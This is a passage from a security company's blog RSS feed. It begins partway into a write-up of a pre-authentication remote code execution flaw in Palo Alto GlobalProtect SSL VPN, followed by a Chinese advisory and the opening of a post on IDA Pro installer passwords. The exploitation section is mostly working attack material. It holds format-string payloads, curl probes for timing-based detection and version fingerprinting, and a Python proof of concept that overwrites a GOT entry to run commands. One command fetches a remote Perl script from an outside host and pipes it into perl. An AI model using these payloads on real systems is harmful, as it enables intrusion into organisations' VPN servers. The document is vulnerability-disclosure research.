&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl https://global-protect/sslmgr
&amp;lt;?xml &lt;span class=&quot;nv&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;1.0&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;encoding&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;UTF-8&quot;&lt;/span&gt; ?&amp;gt;
        &amp;lt;clientcert-response&amp;gt;
                &amp;lt;status&amp;gt;error&amp;lt;/status&amp;gt;
                &amp;lt;msg&amp;gt;Invalid parameters&amp;lt;/msg&amp;gt;
        &amp;lt;/clientcert-response&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;During the parameter extraction, the daemon searches the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;scep-profile-name&lt;/code&gt; and pass its value as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; format to fill in the buffer. That leads to the format string attack. You can just crash the service with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%n&lt;/code&gt;!&lt;/p&gt;

&lt;div class=&quot;language-http highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;/sslmgr&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;HTTP&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;1.1&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Host&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;global-protect&lt;/span&gt;
&lt;span class=&quot;na&quot;&gt;Content-Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;36&lt;/span&gt;

scep-profile-name=%n%n%n%n%n...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;affect-versions&quot;&gt;Affect versions&lt;/h2&gt;

&lt;p&gt;According to our survey, all the GlobalProtect before &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;July 2018&lt;/code&gt; are vulnerable! Here is the affect version list:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The series 9.x and 7.0.x are not affected by this vulnerability.&lt;/p&gt;

&lt;h2 id=&quot;how-to-verify-the-bug&quot;&gt;How to verify the bug&lt;/h2&gt;

&lt;p&gt;Although we know where the bug is, to verify the vulnerability is still not easy. There is no output for this format string so that we can‚Äôt obtain any address-leak to verify the bug. And to crash the service is never our first choice[1]. In order to avoid crashes, we need to find a way to verify the vulnerability elegantly!&lt;/p&gt;

&lt;p&gt;By reading the &lt;a href=&quot;https://linux.die.net/man/3/snprintf&quot;&gt;snprintf manual&lt;/a&gt;, we choose  the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%c&lt;/code&gt; as our gadget! When there is a number before the format, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%9999999c&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;snprintf&lt;/code&gt; repeats the corresponding times internally. We observe the response time of large repeat number to verify this vulnerability!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%9999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m1.721s
user    0m0.037s
sys     0m0.005s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%99999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m2.051s
user    0m0.035s
sys     0m0.012s
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=%999999999c&apos;&lt;/span&gt; https://global-protect/sslmgr &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
real    0m5.324s
user    0m0.021s
sys     0m0.018s
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the response time increases along with the number of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%c&lt;/code&gt;. So, from the time difference, we can identify the vulnerable SSL VPN elegantly!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;[1] Although there is a watchdog monitoring the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; daemon, it‚Äôs still improper to crash a service!&lt;/em&gt;&lt;/p&gt;

&lt;h2 id=&quot;the-exploitation&quot;&gt;The exploitation&lt;/h2&gt;

&lt;p&gt;Once we can verify the bug, the exploitation is easy. To exploit the binary successfully, we need to determine the detail version first. We can distinguish by the Last-Modified header, such as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/global-protect/portal/css/login.css&lt;/code&gt; from 8.x version and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/images/logo_pan_158.gif&lt;/code&gt; from 7.x version!&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; https://sslvpn/global-protect/portal/css/login.css | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Last-Modified
Last-Modified: Sun, 10 Sep 2017 16:48:23 GMT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;With a specified version, we can write our own exploit now. We simply modified the pointer of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strlen&lt;/code&gt; on the Global Offset Table(GOT) to the Procedure Linkage Table(PLT) of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;system&lt;/code&gt;. Here is the PoC:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;#!/usr/bin/python
&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/sslmgr&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;echo pwned &amp;gt; /var/appweb/sslvpndocs/hacked.txt&quot;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x667788&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x445566&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;# change me
&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;  &lt;span class=&quot;s&quot;&gt;&apos;%70$n&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;c&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%32$hn&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xffff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_plt&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;c&apos;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%24$hn&apos;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;%&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;$p&apos;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;scep-profile-name=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;host-id=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;strlen_GOT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;user-email=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fmt&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&amp;amp;appauthcookie=&quot;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cmd&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once the modification is done, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sslmgr&lt;/code&gt; becomes our webshell and we can execute commands via:&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;scep-profile-name=curl orange.tw/bc.pl | perl -&apos;&lt;/span&gt; https://global-protect/sslmgr
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;We have reported this bug to Palo Alto via the &lt;a href=&quot;https://securityadvisories.paloaltonetworks.com/Report&quot;&gt;report form&lt;/a&gt;. However, we got the following reply:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hello Orange,&lt;/p&gt;

  &lt;p&gt;Thanks for the submission. Palo Alto Networks does follow coordinated vulnerability disclosure for security vulnerabilities that are reported to us by external researchers. We do not CVE items found internally and fixed. This issue was previously fixed, but if you find something in a current version, please let us know.&lt;/p&gt;

  &lt;p&gt;Kind regards&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Hmmm, so it seems this vulnerability is known for Palo Alto, but not ready for the world!&lt;/p&gt;

&lt;h2 id=&quot;the-case-study&quot;&gt;The case study&lt;/h2&gt;

&lt;p&gt;After we awared this is not a 0day, we surveyed all Palo Alto SSL VPN over the world to see if there is any large corporations using the vulnerable GlobalProtect, and Uber is one of them! From our survey, Uber owns about 22 servers running the GlobalProtect around the world, here we take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;vpn.awscorp.uberinternal.com&lt;/code&gt; as an example!&lt;/p&gt;

&lt;p&gt;From the domain name, we guess Uber uses the BYOL from &lt;a href=&quot;https://aws.amazon.com/marketplace/pp/B00OC1T2D4?qid=1562269885823&amp;amp;sr=0-1&amp;amp;ref_=srh_res_product_title&quot;&gt;AWS Marketplace&lt;/a&gt;. From the login page, it seems Uber uses the 8.x version, and we can target the possible target version from the supported version list on the Marketplace overview page:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;8.0.3&lt;/li&gt;
  &lt;li&gt;8.0.6&lt;/li&gt;
  &lt;li&gt;8.0.8&lt;/li&gt;
  &lt;li&gt;8.0.9&lt;/li&gt;
  &lt;li&gt;8.1.0&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Finally, we figured out the version, it‚Äôs 8.0.6 and we got the shell back!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190717/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Uber took a very quick response and right step to fix the vulnerability and Uber gave us a detail explanation to the bounty decision:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Hey @orange ‚Äî we wanted to provide a little more context on the decision for this bounty. During our internal investigation, we found that the Palo Alto SSL VPN is not the same as the primary VPN which is used by the majority of our employees.&lt;/p&gt;

  &lt;p&gt;Additionally, we hosted the Palo Alto SSL VPN in AWS as opposed to our core infrastructure; as such, this would not have been able to access any of our internal infrastructure or core services. For these reasons, we determined that while it was an unauthenticated RCE, the overall impact and positional advantage of this was low. Thanks again for an awesome report!&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It‚Äôs a fair decision. It‚Äôs always a great time communicating with Uber and report to their &lt;a href=&quot;https://hackerone.com/uber&quot;&gt;bug bounty program&lt;/a&gt;. We don‚Äôt care about the bounty that much, because we enjoy the whole research process and feeding back to the security community! Nothing can be better than this!&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/</link>
                <guid>https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Palo Alto GlobalProtect Ë≥áÂÆâÈÄöÂ†±</title>
                <description>&lt;h3 id=&quot;ÂÖßÂÆπ&quot;&gt;ÂÖßÂÆπ&lt;/h3&gt;

&lt;p&gt;Âú®ÊàëÂÄëÈÄ≤Ë°å&lt;a href=&quot;https://devco.re/services/red-team&quot;&gt;Á¥ÖÈöäÊºîÁ∑¥&lt;/a&gt;ÁöÑÈÅéÁ®ã‰∏≠ÔºåÁôºÁèæÁõÆÊ®ô‰ΩøÁî®ÁöÑ Palo Alto GlobalProtect Â≠òÂú® format string Âº±ÈªûÔºåÈÄèÈÅéÊ≠§Âº±ÈªûÂèØÊéßÂà∂Ë©≤ SSL VPN ‰º∫ÊúçÂô®Ôºå‰∏¶ËóâÊ≠§ÈÄ≤ÂÖ•‰ºÅÊ•≠ÂÖßÁ∂≤„ÄÇ&lt;/p&gt;

&lt;p&gt;ÂõûÂ†±ÂéüÂª†ÂæåÔºåÂæóÁü•ÈÄôÊòØÂÄãÂ∑≤Áü•Âº±Èªû‰∏¶‰∏îÂ∑≤Á∂ì silent-fix ‰∫ÜÔºåÊâÄ‰ª•‰∏¶Êú™Êúâ CVE Á∑®Ëôü„ÄÇÁ∂ìÈÅéÊàëÂÄëÂàÜÊûêÔºåÂ≠òÂú®È¢®Èö™ÁöÑÁâàÊú¨Â¶Ç‰∏ãÔºåÂª∫Ë≠∞Áî®Êà∂ÂÑòÈÄüÊõ¥Êñ∞Ëá≥ÊúÄÊñ∞Áâà‰ª•ÈÅøÂÖçÈÅ≠ÂèóÊîªÊìä„ÄÇ&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 7.1.x &amp;lt; 7.1.19&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.0.x &amp;lt; 8.0.12&lt;/li&gt;
  &lt;li&gt;Palo Alto GlobalProtect SSL VPN 8.1.x &amp;lt; 8.1.3&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;9.x Âíå 7.0.x ‰∏¶Ê≤íÊúâÂ≠òÂú®È¢®Èö™„ÄÇ&lt;/p&gt;

&lt;h3 id=&quot;Á¥∞ÁØÄ&quot;&gt;Á¥∞ÁØÄ&lt;/h3&gt;

&lt;p&gt;ÊàëÂÄë‰πüÂà©Áî®‰∫ÜÈÄôÂÄãÂº±ÈªûÊàêÂäüÊéßÂà∂‰∫Ü Uber ÁöÑ VPN ‰º∫ÊúçÂô®ÔºåË©≥Á¥∞ÁöÑÊäÄË°ìÁ¥∞ÁØÄË´ãÂèÉÈñ±ÊàëÂÄëÁöÑ AdvisoryÔºö
&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ÈôÑË®ª&quot;&gt;ÈôÑË®ª&lt;/h3&gt;

&lt;p&gt;ÈÄôÂ∞áÊúÉÊòØÊàëÂÄë SSL VPN Á†îÁ©∂ÁöÑÁ≥ªÂàóÊñáÔºåÈ†êË®àÊúÉÊúâ‰∏âÁØá„ÄÇÈÄô‰πüÊòØÊàëÂÄëÁ†îÁ©∂ÂúòÈöä‰ªäÂπ¥Âú® &lt;a href=&quot;https://www.blackhat.com/us-19/briefings/schedule/#infiltrating-corporate-intranet-like-nsa---pre-auth-rce-on-leading-ssl-vpns-15545&quot;&gt;Black Hat USA&lt;/a&gt; Âíå &lt;a href=&quot;https://www.defcon.org/html/defcon-27/dc-27-speakers.html&quot;&gt;DEFCON&lt;/a&gt; ÁöÑÊºîË¨õ„Äé &lt;strong&gt;Infiltrating Corporate Intranet Like NSA - Pre-auth RCE on Leading SSL VPNs&lt;/strong&gt; „Äè‰∏≠ÁöÑ‰∏ÄÂ∞èÈÉ®ÂàÜÔºåÊï¨Ë´ãÊúüÂæÖÔºÅ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory/</link>
                <guid>https://devco.re/blog/2019/07/17/Palo-Alto-GlobalProtect-advisory</guid>
                <pubDate>Wed, 17 Jul 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Á†¥ÂØÜË°åÂãï: ‰ª•‰∏çÂ∞ãÂ∏∏ÁöÑËßíÂ∫¶Á†¥Ëß£ IDA Pro ÂÅΩÈö®Ê©üÊï∏</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way-en/&quot;&gt;English Version&lt;/a&gt;
&lt;a href=&quot;/blog/2019/06/21/operation-crack-hacking-IDA-Pro-installer-PRNG-from-an-unusual-way/&quot;&gt;‰∏≠ÊñáÁâàÊú¨&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;ÂâçË®Ä&quot;&gt;ÂâçË®Ä&lt;/h2&gt;

&lt;p&gt;Hex-Rays IDA Pro ÊòØÁõÆÂâç‰∏ñÁïå‰∏äÊúÄÁü•ÂêçÁöÑÂèçÁµÑË≠ØÂ∑•ÂÖ∑Ôºå‰ªäÂ§©ÊàëÂÄëÊÉ≥‰æÜËÅäËÅäÂÆÉÁöÑÂÆâË£ùÂØÜÁ¢º„ÄÇ‰ªÄÈ∫ºÊòØÂÆâË£ùÂØÜÁ¢ºÔºü‰∏ÄËà¨‰æÜË™™ÔºåÂú®ÂÆåÊàê IDA Pro Ë≥ºË≤∑ÊµÅÁ®ãÂæåÔºåÊúÉÊî∂Âà∞‰∏ÄÂÄãÂÆ¢Ë£ΩÂåñÂÆâË£ùÊ™îÂèäÂÆâË£ùÂØÜÁ¢ºÔºåÂú®Á®ãÂºèÂÆâË£ùÈÅéÁ®ã‰∏≠ÔºåÊúÉÈúÄË¶ÅÈÇ£ÁµÑÂÆâË£ùÂØÜÁ¢ºÊâçÂæó‰ª•ÁπºÁ∫åÂÆâË£ù„ÄÇÈÇ£È∫ºÔºåÂ¶ÇÊûú‰ªäÂ§©Âú®Á∂≤Ë∑Ø‰∏äÁôºÁèæ‰∏ÄÂåÖÊ¥©ÊºèÁöÑ IDA Pro ÂÆâË£ùÊ™îÔºåÊàëÂÄëÊúâÂèØËÉΩÂú®‰∏çÁü•ÈÅìÂØÜÁ¢ºÁöÑÁãÄÊ≥Å‰∏ãÈ†ÜÂà©ÂÆâË£ùÂóéÔºüÈÄôÊòØ‰∏ÄÂÄãÊúâË∂£ÁöÑÈñãÊîæÊÄßÂïèÈ°å„ÄÇ&lt;/p&gt;

